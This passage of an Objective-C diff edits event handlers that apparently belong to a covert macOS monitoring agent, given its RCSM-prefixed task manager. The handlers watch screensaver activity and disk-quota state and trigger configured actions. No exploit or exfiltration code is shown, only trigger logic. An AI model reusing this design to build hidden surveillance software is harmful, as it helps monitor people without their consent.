   while ([configuration objectForKey: @"status"] != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      int onTermination;
       
-      [[configuration objectForKey: @"data"] getBytes: &onTermination];
-      int actionID = [[configuration objectForKey: @"actionID"] intValue];
-      NSString *process = [[NSString stringWithString: SCREENSAVER_PROCESS] retain];
-      
-      if (screenSaverFound == TRUE && findProcessWithName([process lowercaseString]) == NO)
+      if (screenSaverFound == TRUE && findProcessWithName(process_lowercaseString) == NO)
         {
           screenSaverFound = FALSE;
 
-          if (onTermination != -1)
+          if (onTermination != 0xFFFFFFFF &&
+              [self isEventEnable: configuration] == TRUE)
             {
-#ifdef DEBUG_EVENTS
-              warnLog(@"Application (%@) Terminated, action %d", process, onTermination);
-#endif
               [taskManager triggerAction: onTermination];
             }
         }
-      else if (screenSaverFound == FALSE && findProcessWithName([process lowercaseString]) == YES)
+      else if (screenSaverFound == FALSE && findProcessWithName(process_lowercaseString) == YES)
         {
           screenSaverFound = TRUE;
-#ifdef DEBUG_EVENTS
-          warnLog(@"Application (%@) Executed, action %d", process, actionID);
-#endif
-          [taskManager triggerAction: actionID];
+          
+          if ([self isEventEnable: configuration] == TRUE)
+            [taskManager triggerAction: actionID];
+          
+          currentIter = 0;
         }
       
-      [process release];
+    if (screenSaverFound == TRUE)
+      {
+        if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+            [self waitDelaySeconds:configuration] == FALSE)
+          {
+            if ([self isEventEnable: configuration] == TRUE)
+              [taskManager triggerAction: repeat];
+            currentIter++;
+          }
+      }
+      
       [innerPool release];
       
       usleep(500000);
@@ -993,18 +1100,95 @@ NSLock *connectionLock;
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
-#ifdef DEBUG_EVENTS
-      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
-#endif
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
-      [configuration release];
     }
+
+  [configuration release];
   
   [outerPool release];
 }
 
+- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *actionId = (NSNumber*)[aNotify object];
+
+  if (actionId && [actionId intValue] > -1)
+    {
+#ifdef DEBUG_EVENTS
+    infoLog(@"event quota triggering action %@", actionId);
+#endif
+      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
+    }
+}
+
+typedef struct {
+  UInt32 disk_quota;
+  UInt32 tag;
+  UInt32 exit_event;
+} quota_conf_entry_t;
+
+// Done.!
 - (void)eventQuota: (NSDictionary *)configuration
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+  [configuration retain];
+  
+  quota_conf_entry_t *params = (quota_conf_entry_t*)[[configuration objectForKey: @"data"] bytes];
+  
+  int exitAction    = params->exit_event;
+  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int currentIter = iter;
+  
+  // Setting parameter
+  [[RCSMDiskQuota sharedInstance] setEventQuotaParam: configuration 
+                                           andAction: [configuration objectForKey:@"actionID"]];
+                                           
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+    {
+      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
+        {
+          mEventQuotaRunning = YES;
+          
+          if ([self isEventEnable: configuration] == TRUE)
+            [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+          currentIter = 0;
+        }
+        
+      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
+        {
+          mEventQuotaRunning = NO;
+          if ([self isEventEnable: configuration] == TRUE)
+            [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
+        }
+    
+      if (mEventQuotaRunning == TRUE)
+        {
+          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+              [self waitDelaySeconds:configuration] == FALSE &&
+              [self isEventEnable: configuration] == TRUE)
+            {
+              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
+              currentIter++;
+            }
+        }
+      
+      usleep(300000);
+    }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+    {
+      [configuration setValue: EVENT_STOPPED forKey: @"status"];
+      
+      mEventQuotaRunning = NO;
+    }
+    
+  [configuration release];
+  [outerPool release];
+  
   return;
 }
 
